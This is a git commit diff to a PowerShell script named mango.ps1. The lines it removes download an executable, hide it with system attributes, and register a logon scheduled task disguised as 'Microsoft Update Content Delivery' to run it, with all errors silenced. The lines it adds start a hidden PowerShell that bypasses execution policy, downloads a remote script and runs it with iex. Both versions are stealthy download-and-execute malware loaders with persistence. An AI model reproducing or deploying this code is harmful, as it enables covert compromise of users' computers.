82495128d94336f4398ed66dbc49ada4c8fa1bdb
Seva <68725282+sevcator@users.noreply.github.com>
2025-06-30 15:48:46 +0700

    Update mango.ps1

--- mango.ps1
+++ mango.ps1
@@ -1,11 +1,3 @@
-Clear-Host
-$downloadUrl = "https://github.com/sevcator/mango-mango-mango/releases/download/1/MANGO.exe"
-$destinationPath = "$env:USERPROFILE\Documents\mango.exe"
-Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -ErrorAction SilentlyContinue > $null 2>&1
-attrib +h +s $destinationPath > $null 2>&1
-$taskName = "Microsoft Update Content Delivery"
-$action = New-ScheduledTaskAction -Execute $destinationPath
-$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME -ErrorAction SilentlyContinue > $null 2>&1
-Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue > $null 2>&1
+$scriptUrl = 'https://raw.githubusercontent.com/sevcator/mango-mango-mango/refs/heads/main/mango.ps1'
+Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iwr -Uri '$scriptUrl' -UseBasicParsing | iex`"" -WindowStyle Hidden
 exit
